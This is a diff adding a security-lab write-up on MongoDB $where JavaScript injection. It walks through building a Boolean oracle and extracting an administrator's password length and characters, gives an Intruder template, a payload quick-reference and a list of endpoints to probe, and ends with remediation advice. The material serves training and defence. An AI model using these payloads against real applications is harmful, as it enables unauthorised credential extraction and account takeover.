@@ -424,3 +424,256 @@ Shows successful login after applying:
 ```
 
 ---
+
+# 🔰 LAB: MongoDB $where JavaScript Injection — Boolean-Based Admin Password Extraction
+
+## 🔹 ONE-LINE SUMMARY
+
+MongoDB JavaScript Injection via the `$where` operator, allowing Boolean-based password extraction (length + characters) and full admin takeover using a server-side JavaScript oracle.
+
+---
+
+## 🔹 WHAT IS THIS TOPIC ABOUT?
+
+This lab demonstrates **NoSQL JavaScript Injection** inside the `$where` clause.
+
+MongoDB allows execution of JavaScript such as:
+
+- `this.password.length`
+- `this.password[i]`
+- `this.username == 'admin'`
+- Boolean expressions `&&`, `||`
+
+If user input is placed inside:
+
+```
+"$where": "this.username == '" + user + "'"
+```
+
+then attacker input like:
+
+```
+wiener' && '1'=='1
+```
+
+breaks the string → injects JavaScript → turns the lookup endpoint into a Boolean oracle.
+
+Using this, attackers can extract:
+
+- Password length  
+- Password characters one-by-one  
+- Sensitive fields in documents  
+- Administrator credentials  
+
+---
+
+## 🔹 REAL-WORLD SCENARIO
+
+This is extremely common in:
+
+- Node.js + Express + MongoDB apps  
+- MERN stack startups  
+- Mobile app backends (React Native, Flutter with MongoDB Atlas)  
+- Search / lookup APIs that use `$where`  
+- Legacy codebases using "string-concatenated" filters  
+
+A single quote `'` often breaks the JS string and gives direct logic injection.
+
+This exact vulnerability appears in:
+
+- Banking mobile apps using MongoDB  
+- University management systems  
+- E-commerce product search APIs  
+- Poorly written freelance MERN projects  
+- Admin dashboards with lookup features  
+
+---
+
+## 🔹 HIGH-VALUE ENDPOINTS TO TEST
+
+Only test endpoints that perform **lookup**, **filter**, or **search**:
+
+- `/user/lookup?user=...`
+- `/api/users/find?username=...`
+- `/login`
+- `/profile?id=...`
+- `/search?username=...`
+
+Signs of JavaScript injection risk:
+
+- Backend uses `$where`
+- lookup responses change on TRUE/FALSE conditions
+- URL errors when `'` is added
+- CPU spike on the server (JS evaluation is heavy)
+
+---
+
+## 🔹 HOW THIS ATTACK WORKS (CORE LOGIC)
+
+1. Insert `'` to break out of string  
+2. Insert JS logic:
+   ```
+   ' && <boolean> || '
+   ```
+3. Control TRUE/FALSE responses  
+4. Use responses to build a Boolean oracle  
+5. Determine password length  
+6. Extract characters using indexed access  
+7. Compile full password  
+8. Log in as admin  
+
+MongoDB returns a document **only if the injected JS evaluates TRUE**.
+
+---
+
+## 🔹 EXACT LAB WALKTHROUGH (OFFICIAL SOLUTION FLOW)
+
+### 1. Log in normally  
+   Use:
+   - username: `wiener`
+   - password: `peter`
+
+Capture the request.
+
+---
+
+### 2. Intercept lookup request  
+Go to:
+```
+GET /user/lookup?user=wiener
+```
+Send to Repeater.
+
+---
+
+### 3. Confirm injection  
+Send:
+```
+wiener'
+```
+If error appears → injection confirmed.
+
+---
+
+### 4. Test safe JavaScript execution  
+Payload:
+```
+wiener'+'
+```
+URL-encode it.
+
+If response still returns valid user info → backend executes JS.
+
+---
+
+### 5. Build Boolean oracle  
+FALSE test:
+```
+wiener' && '1'=='2
+```
+
+TRUE test:
+```
+wiener' && '1'=='1
+```
+
+If TRUE returns profile → oracle confirmed.
+
+---
+
+### 6. Extract admin password length  
+Test progressively:
+
+```
+administrator' && this.password.length < 30 || 'x'=='x
+administrator' && this.password.length < 20 || 'x'=='x
+administrator' && this.password.length < 10 || 'x'=='x
+administrator' && this.password.length < 9  || 'x'=='x   → TRUE
+administrator' && this.password.length < 8  || 'x'=='x   → FALSE
+```
+
+Password length = **8**.
+
+---
+
+### 7. Extract each character using Intruder (Boolean-based)  
+
+Template:
+
+```
+administrator' && this.password[§0§]=='§a§
+```
+
+Configure:
+
+- Position 1 → index `0–7`
+- Position 2 → characters `a–z0–9!@#$%^&*`
+- Attack type → Cluster Bomb
+
+The TRUE response is the correct character.
+
+Repeat for all 8 indices → reconstruct full admin password.
+
+---
+
+### 8. Log in as admin  
+Use:
+
+```
+administrator : <extracted_password>
+```
+
+Lab solved.
+
+---
+
+## 🔹 SCREENSHOT PLACEHOLDER
+
+📸 SS #1 — Intruder brute-forcing admin password  
+![](../images/admin-password-bruteforce-nosql.png)
+
+---
+
+## 🔹 COMMON PAYLOADS (QUICK REFERENCE)
+
+Check injection:
+```
+wiener'
+```
+
+Boolean oracle:
+```
+wiener' && '1'=='1
+```
+
+Password length check:
+```
+administrator' && this.password.length < 10 || 'a'=='a
+```
+
+Specific character check:
+```
+administrator' && this.password[3]=='r' || 'a'=='a
+```
+
+---
+
+## 🔹 REMEDIATION / DEFENSES
+
+1. **Never** allow user input inside a `$where` clause.  
+2. Disable MongoDB server-side JavaScript.  
+3. Enforce strict schema validation (Zod/Joi).  
+4. Reject nested objects and operators.  
+5. Use safe queries:
+   ```
+   db.users.find({ username: input })
+   ```
+   NOT:
+   ```
+   db.users.find({ $where: "this.username=='" + input + "'" })
+   ```
+
+6. Minimal privilege roles.  
+7. Don’t expose sensitive fields in lookup routes.  
+
+---
